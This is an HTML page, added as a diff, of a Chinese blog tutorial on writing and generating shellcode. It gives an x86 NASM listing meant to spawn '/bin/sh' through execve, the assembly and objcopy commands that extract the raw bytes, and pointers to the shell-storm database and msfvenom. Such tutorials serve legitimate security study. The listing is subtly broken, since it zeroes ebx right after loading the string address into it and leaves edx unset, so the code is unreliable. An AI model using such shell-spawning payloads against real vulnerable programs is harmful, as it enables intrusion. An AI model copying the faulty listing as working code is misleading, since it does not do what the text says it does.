@@ -1,0 +1,165 @@
+<!DOCTYPE html><html lang="zh-Hans" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>shellcode与shellcode生成 | Tover' Blog</title><meta name="keywords" content="PWN"><meta name="author" content="Tover. L"><meta name="copyright" content="Tover. L"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制之机械码，以其经常让攻击者获得shell而得名——wiki 简单来说就是一段可以执行特定功能(一定情况下)的“字符串”。 shellcode可以自己写汇编生成，比如(假设文件名shell.asm)： 12345678910111213141516[section .data]global _start_start:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="shellcode与shellcode生成">
+<meta property="og:url" content="https://tover.xyz/2021/09/12/shellcode/index.html">
+<meta property="og:site_name" content="Tover&#39; Blog">
+<meta property="og:description" content="shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制之机械码，以其经常让攻击者获得shell而得名——wiki 简单来说就是一段可以执行特定功能(一定情况下)的“字符串”。 shellcode可以自己写汇编生成，比如(假设文件名shell.asm)： 12345678910111213141516[section .data]global _start_start:">
+<meta property="og:locale">
+<meta property="og:image" content="https://tover.xyz/img/cai2.png">
+<meta property="article:published_time" content="2021-09-12T12:35:01.000Z">
+<meta property="article:modified_time" content="2021-09-12T12:48:34.837Z">
+<meta property="article:author" content="Tover. L">
+<meta property="article:tag" content="PWN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tover.xyz/img/cai2.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://tover.xyz/2021/09/12/shellcode/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'shellcode与shellcode生成',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2021-09-12 20:48:34'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">16</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a></div></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/../img/cai2.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Tover' Blog</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">shellcode与shellcode生成</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-09-12T12:35:01.000Z" title="Created 2021-09-12 20:35:01">2021-09-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-09-12T12:48:34.837Z" title="Updated 2021-09-12 20:48:34">2021-09-12</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">373</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>1min</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="shellcode与shellcode生成"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制之机械码，以其经常让攻击者获得shell而得名——<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Shellcode">wiki</a></p>
+<p>简单来说就是一段可以执行特定功能(一定情况下)的“字符串”。</p>
+<p>shellcode可以自己写汇编生成，比如(假设文件名shell.asm)：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[section .data]</span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">    jmp sh</span><br><span class="line"></span><br><span class="line">se:</span><br><span class="line">    pop ebx </span><br><span class="line">    xor eax, eax </span><br><span class="line">    mov al, 11</span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    xor ebx, ebx</span><br><span class="line">    int 0x80</span><br><span class="line"></span><br><span class="line">sh:</span><br><span class="line">    call se</span><br><span class="line">    db &#x27;/bin/sh&#x27;,0</span><br></pre></td></tr></table></figure>
+<p>要编译成x86的shellcode的话(不同系统架构生成的shellcode是不同的)可以通过执行下面命令编译：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nasm -felf32 shell.asm -o shell.o</span><br><span class="line">ld -melf_i386 shell.o -o shell</span><br><span class="line">objcopy -O binary shell.o shell.bin</span><br></pre></td></tr></table></figure>
+<p>最后shell.bin里面就是想要的shellcode。</p>
+<p>shellcode也可以到网上的数据库去找，比如<a target="_blank" rel="noopener" href="http://shell-storm.org/shellcode/">这个</a>，打开<a target="_blank" rel="noopener" href="http://shell-storm.org/shellcode/files/shellcode-517.php">其中一个页面</a>看一下：</p>
+<img src="/2021/09/12/shellcode/1.png" class="" title="img_1">
+<p>里面是这个shellcode的一个C语言的deemo，复制下来编译运行一下(是x86的，所以要编译成32位程序，还要关闭<a target="_blank" rel="noopener" href="http://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/#%E5%9B%9B%E3%80%81NX%EF%BC%88DEP%EF%BC%89">NX保护</a>)，运行时可以成功跑出一个shell：</p>
+<img src="/2021/09/12/shellcode/2.png" class="" title="img_2">
+<p>查数据库的话其实还是有一定局限性的，比如我只想运行特定的命令，或者绕过某一些限制。所以还有另一种做法的话是用工具生成，比如有一个叫msfvenom的，可以根据要执行的命令生成shellcode，比如我只想执行&quot;uname -a&quot;：</p>
+<img src="/2021/09/12/shellcode/3.png" class="" title="img_3">
+<p>（但其实还是觉得手写的shellcode才是坠吼的 - -）</p>
+<p>( 原文地址：<a target="_blank" rel="noopener" href="https://0xffff.one/d/344">https://0xffff.one/d/344</a> )</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Tover. L</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://tover.xyz/2021/09/12/shellcode/">https://tover.xyz/2021/09/12/shellcode/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PWN/">PWN</a></div><div class="post_share"><div class="social-share" data-image="/../img/cai2.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/09/12/strings-and-memory/"><img class="prev-cover" src="/../img/cai2.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">【科普】 那些放在不同位置的字符串</div></div></a></div><div class="next-post pull-right"><a href="/2021/09/12/libc-compile/"><img class="next-cover" src="/../img/cai2.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">编译带debug_info的glibc</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2021/09/13/about-gdb/" title="水一水GDB调试器的用法（入门+进阶）"><img class="cover" src="/../img/cai2.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-09-13</div><div class="title">水一水GDB调试器的用法（入门+进阶）</div></div></a></div><div><a href="/2021/09/12/libc-compile/" title="编译带debug_info的glibc"><img class="cover" src="/../img/cai2.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-09-12</div><div class="title">编译带debug_info的glibc</div></div></a></div><div><a href="/2021/09/12/kernel-pwn/" title="内核PWN入坑指南"><img class="cover" src="/../img/cai2.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-09-12</div><div class="title">内核PWN入坑指南</div></div></a></div><div><a href="/2021/09/12/pwnable-tw-writeup-v2/" title="pwnable.tw部分writeup(不定期更新)_Vol.2"><img class="cover" src="/../img/cai2.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-09-12</div><div class="title">pwnable.tw部分writeup(不定期更新)_Vol.2</div></div></a></div><div><a href="/2021/09/12/pwnable-tw-writeup/" title="pwnable.tw部分writeup(不定期更新)"><img class="cover" src="/../img/cai2.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-09-12</div><div class="title">pwnable.tw部分writeup(不定期更新)</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Tover. L</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">16</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ToverPomelo"><i class="fab fa-github"></i><span>Don't Follow Me (x</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">二进制是密码学人的自我修养 =v=</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/09/13/spider/" title="【摸鱼】写下爬虫"><img src="/../img/cai2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【摸鱼】写下爬虫"/></a><div class="content"><a class="title" href="/2021/09/13/spider/" title="【摸鱼】写下爬虫">【摸鱼】写下爬虫</a><time datetime="2021-09-13T14:06:01.000Z" title="Created 2021-09-13 22:06:01">2021-09-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/09/13/sec-x-n-dx/" title="∫[sec(x)]^n dx"><img src="/../img/cai2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="∫[sec(x)]^n dx"/></a><div class="content"><a class="title" href="/2021/09/13/sec-x-n-dx/" title="∫[sec(x)]^n dx">∫[sec(x)]^n dx</a><time datetime="2021-09-13T13:43:03.000Z" title="Created 2021-09-13 21:43:03">2021-09-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/09/13/about-gdb/" title="水一水GDB调试器的用法（入门+进阶）"><img src="/../img/cai2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="水一水GDB调试器的用法（入门+进阶）"/></a><div class="content"><a class="title" href="/2021/09/13/about-gdb/" title="水一水GDB调试器的用法（入门+进阶）">水一水GDB调试器的用法（入门+进阶）</a><time datetime="2021-09-13T13:31:44.000Z" title="Created 2021-09-13 21:31:44">2021-09-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/09/13/cpp-libc-change/" title="关于C++更换标准库"><img src="/../img/cai2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="关于C++更换标准库"/></a><div class="content"><a class="title" href="/2021/09/13/cpp-libc-change/" title="关于C++更换标准库">关于C++更换标准库</a><time datetime="2021-09-13T13:24:14.000Z" title="Created 2021-09-13 21:24:14">2021-09-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/09/13/pytorch-sso-login/" title="基于PyTorch实现学校sso免验证码登录"><img src="/../img/cai2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="基于PyTorch实现学校sso免验证码登录"/></a><div class="content"><a class="title" href="/2021/09/13/pytorch-sso-login/" title="基于PyTorch实现学校sso免验证码登录">基于PyTorch实现学校sso免验证码登录</a><time datetime="2021-09-13T13:15:13.000Z" title="Created 2021-09-13 21:15:13">2021-09-13</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Tover. L</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
